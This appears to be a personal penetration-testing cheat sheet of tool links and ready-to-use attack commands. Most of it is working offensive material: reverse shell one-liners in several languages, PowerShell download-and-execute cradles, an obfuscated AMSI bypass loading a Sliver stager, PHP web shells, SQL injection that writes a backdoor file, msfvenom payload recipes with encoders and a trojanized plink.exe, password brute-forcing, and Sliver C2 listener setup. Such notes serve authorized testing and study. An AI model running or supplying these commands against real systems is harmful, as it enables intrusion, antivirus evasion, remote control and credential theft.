#LINKS
CrackMapExec
JNDI-Exploit-Kit
PayloadsAllTheThings
SecLists
juicy-potato
rogue-jndi
GitTools
PEASS-ng
RoguePotato
impacket
nishang
scapy
https://github.com/internetwache/GitTools
https://github.com/Hackplayers/evil-winrm
https://github.com/byt3bl33d3r/CrackMapExec
https://github.com/danielmiessler/SecLists.git
https://unix.stackexchange.com/questions/116191/give-server-access-to-internet-via-client-connecting-by-ssh
showmount (nfs-common)
hashcat
nishang (example windows rev shell)
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
rouge potato (windows privesc, do whoami /all then check for SeImpersonatePrivilege Enabled)
steghide (stenography in images)
wpscan (wordpress)
https://gchq.github.io/CyberChef/
cewl and crunch
hydra
gobuster
sqlmap
gopher (protocol smuggling)
exiftool
nasm (find JMP ESP address)
ghidra (rev engineering)
immunity debugger (rev engineering)
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
https://github.com/byt3bl33d3r/OffensiveNim
https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti


#ENUMERATION
1. sudo -l
2. check all config files, specially mysql creds...
3. check ls -al /etc/passwd -- cat /etc/passwd
4. find / -perm /5000 2>/dev/null ; find / -perm /4000 2>/dev/null
5. pspy for finding cron tasks
6. writable files


#SUID
https://gtfobins.github.io/


#DOCKER
docker run -it -v /:/mnt ubuntu


#SHELLSHOCK
() { :; }; echo; echo vulnerable;


#WINDOWS
echo "IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/')" | iconv -t utf-16le | base64 -w 0
powershell -enc <result from above cmd>
powershell IWR -Uri http://<ip>:<port>/ -Outfile c:\<file>
powershell Invoke-WebRequest -Uri http://<ip>:<port>/ -Outfile c:\<file>
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://target/file.exe','C:\Users\user\Desktop\file.exe')"

#KERBEROASTABLE
impacket-GetUserSPNs domain.com/user:password -dc-ip 127.0.0.1 -Request

#AMSI BYPASS
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
iex(New-Object net.webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")

$assem = [System.Reflection.Assembly]::LoadFrom('C:\Users\haha150\Desktop\ClassLibrary2.dll')
$class = $assem.GetType('Sliver_stager.Program')
$method = $class.GetMethod("DownloadAndExecute")
$method.Invoke(0, $null)
iex(New-Object net.webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")

#STABILIZE SHELL
python -c 'import pty;pty.spawn("/bin/bash")'
or
python3 -c 'import pty;pty.spawn("/bin/bash")'
control + z
stty raw -echo
fg
export TERM=xterm


#BUFFER OVERFLOW
https://tryhackme.com/room/bufferoverflowprep 
https://esseum.com/win-32-buffer-overflow-walkthrough-exploiting-slmail-5-5/
https://www.youtube.com/watch?v=8ZnmA4KH4bY&feature=youtu.be
https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
for i in range(0,256): print('\\x%02X' % i, end='')


#REVERSE SHELLS
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Bash:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
or
/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

Perl:
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP:
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby:
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat:
nc -e /bin/sh 10.0.0.1 1234

Java:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

#MISC
Quick TCP Scan
nmap -sC -sV -vv -oA quick targe

Quick UDP Scan
nmap -sU -sV -vv -oA quick_udp target

Full TCP Scan
nmap -sC -sV -p--vv -oA full target

Port knock
for x in 7000 8000 9000; do nmap -Pn --host_timeout201 --max-retries 0 -p $x target; done

Web Scanning
Gobuster quick directory busting
gobuster -u target -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux

Gobuster search with file extension
gobuster -u target -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php

Nikto web server scan
nikto -h target

Wordpress scan
wpscan -u target/wp/

Netcat banner grab
nc -v target port

Telnet banner grab
telnet target port

Connect to SMB shares
smbclient //MOUNT/share


PHP
PHP command injection from GET Request
<?php echo system($_GET["cmd"]);?>
#Alternative
<?php echo shell_exec($_GET["cmd"]);?>

Powershell
Non-interactive execute powershell file
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1

SSH Tunneling / Pivoting
sshuttle
sshuttle -vvr user@target 10.1.1.0/24

Local port forwarding
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>

Remote port forwarding
ssh <gateway> -R <remote port to bind>:<local host>:<local port>

Dynamic port forwarding ssh -D <local proxy port> -p <remote port> <target>

Plink local port forwardingplink -l root -pw pass -R 3389:<localhost>:3389 <remote host>

SQL Injection
sqlmap -r test.req --batch --dump

# sqlmap crawl  
sqlmap -u http://target --crawl=1

# sqlmap dump database  
sqlmap -u http://target --dbms=mysql --dump

# sqlmap shell  
sqlmap -u http://target --dbms=mysql --os-shell

Upload php command injection file
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

Load file
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6

Bypasses
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 ---
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 ---

Brute force
John the Ripper shadow file
$ unshadow passwd shadow > unshadow.db
$ john unshadow.db

# Hashcat SHA512 $6$ shadow file  
hashcat-m 1800 -a 0 hash.txt rockyou.txt --username

#Hashcat MD5 $1$ shadow file  
hashcat -m 500 -a 0 hash.txt rockyou.txt --username

# Hashcat MD5 Apache webdav file  
hashcat -m 1600 -a 0 hash.txt rockyou.txt

# Hashcat SHA1  
hashcat -m 100 -a 0 hash.txt rockyou.txt --force

# Hashcat Wordpress  
hashcat -m 400 -a 0 --remove hash.txt rockyou.txt

RDP user with password list
ncrack -vv --user offsec -P passwords rdp://target

SSH user with password list
hydra -l user -P pass.txt -t 10 target ssh -s 22

FTP userwith password list
medusa -h target -u user -P passwords.txt -M ftp

MSFVenom Payloads
# PHP reverse shell  
msfvenom -p php/meterpreter/reverse_tcp LHOST=target LPORT=4443 -f raw -o shell.php

# Java WAR reverse shell  
msfvenom -p java/shell_reverse_tcp LHOST=target LPORT=4443 -f war -o shell.war

# Linux bind shell  
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai

# Linux C reverse shell  
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f c

# Windows non staged reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe

# Windows Staged (Meterpreter) reverse shell  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

# Windows Python reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 EXITFUNC=thread -f python -o shell.py

# Windows ASP reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp

# Windows ASPX reverse shell
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx

# Windows JavaScript reverse shell with nops  
msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f js_le -e generic/none -n 18

#Windows Powershell reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

# Windows reverse shell excluding bad characters
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=target LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_na

# Windows x64 bit reverse shell  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=target LPORT=4443 -f exe -o shell.exe

# Windows reverse shell embedded into plink  
msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

# Network ports
sudo ss -antlp

# XSS
<script>
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      alert(this.responseText);
    }
  }
  xhr.open("GET", "/test", true);
  xhr.send();
</script>

#CSRF
<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script> 

#SSTI
check for vuln
${{<%[%'"}}%\.

#SLIVER
profiles new --mtls 10.0.0.152 --format shellcode win-shellcode
or
profiles new --http http://10.0.0.152 --format shellcode win-shellcode
stage-listener --url http://10.0.0.152:80 --profile win-shellcode --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
reconfig -i 30s -j 3s
